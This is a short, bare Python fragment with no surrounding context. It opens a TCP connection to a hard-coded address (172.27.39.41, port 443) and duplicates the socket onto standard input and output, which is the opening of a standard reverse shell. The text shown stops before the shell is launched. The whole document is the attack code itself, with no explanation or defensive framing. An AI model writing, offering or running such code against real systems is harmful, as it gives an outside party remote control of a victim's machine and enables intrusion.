import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("172.27.39.41",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
